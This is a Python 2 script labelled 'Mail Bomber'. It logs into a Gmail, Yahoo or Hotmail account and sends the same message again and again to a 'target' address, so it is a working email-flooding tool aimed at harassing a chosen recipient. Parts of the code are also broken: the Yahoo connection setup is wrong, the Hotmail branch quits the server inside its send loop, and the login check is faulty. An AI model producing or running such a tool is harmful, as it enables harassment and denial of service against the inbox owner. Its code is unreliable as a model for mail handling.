import smtplib
import platform
import getpass
import sys
import datetime


print "\n\n"
print "********************************************************"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|++++++++++++++++++++++\033[1;36mMail Bomber\033[0m+++++++++++++++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|+++++++++++++++++Author : \033[1;32mKOMOL SAHA\033[0m++++++++++++++++++|"
print "|+++++++++++++++facebook/\033[32mKomal.razz11\033[0m++++++++++++++++++|"

#Info
os = platform.system()
sys = platform.release()
print "|+++++++++++++++++Operating System :" +os +"++++++++++++++|"

print"|++++++++++++++Released :"+sys+"++++++++++++|"
time = datetime.datetime.now()
print "|+++++++\033[34mDate & Time\033[0m :"+str(time)+"++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "********************************************************"

print "\n"




smtp   = raw_input("Enter Your Mail Server : ")

if smtp == 'gmail':
		server = smtplib.SMTP('smtp.gmail.com',587)
		server.starttls()

		email     = raw_input("Enter Your Email : ")
		password  = getpass.getpass("Enter the Password:")

		if not  email  and not password:
				print ("You must Login Your Email")
		else:
				server.login(email,password)
				print ("Successfully Signed in")
				
				send = raw_input("Please Enter Your Target Email : ")

				print("Up to 70 messages")
				thread= int(raw_input("Thread : "))
				

				msg = raw_input("Enter Your Message here... :\n")
				
				

				for count in range(int(thread)):
					server.sendmail(email,send,msg)
					print (count,"Message Sent! : ")
					count = count + 1



				server.quit()


elif smtp == 'yahoo':
	server = smtplib.SMTP('smtp.mail.yahoo.com',465)
	server.starttls()
			
	email = raw_input("Enter Your Email : ")
	password = getpass.getpass("Enter the Password:")

	if not  email  and not password:
		print ("You must Login Your Email")
	else:
		server.login(email,password)
		print ("Successfully Signed in")
	
		send = raw_input("Please Enter Your Target Email : ")

		print("Up to 70 messages")
		thread= int(raw_input("Thread : "))
						

		msg = raw_input("Enter Your Message here... :\n")
						
	

		for count in range(int(thread)):
			server.sendmail(email,send,msg)
			print (count,"Message Sent! : ")
			count = count + 1



		server.quit()

elif smtp == 'hotmail':
		server = smtplib.SMTP('smtp-mail.outlook.com',587)
		server.starttls()

		email = raw_input("Enter Your Email : ")
		password = getpass.getpass("Enter the Password:")

		if not  email  and not password:
			print ("You must Login Your Email")
		else:
			server.login(email,password)
			print ("Successfully Signed in")
						
			send = raw_input("Please Enter Your Target Email : ")

			print("Up to 70 messages")
			thread= int(raw_input("Thread : "))
						

			msg = raw_input("Enter Your Message here... :\n")
						
						

			for count in range(int(thread)):
				server.sendmail(email,send,msg)
				print (count,"Message Sent! : ")
				count = count + 1
				server.quit()


else:
		print("You Must Choose One Mail Server : GMAIL/YAHOO/HOTMAIL")				



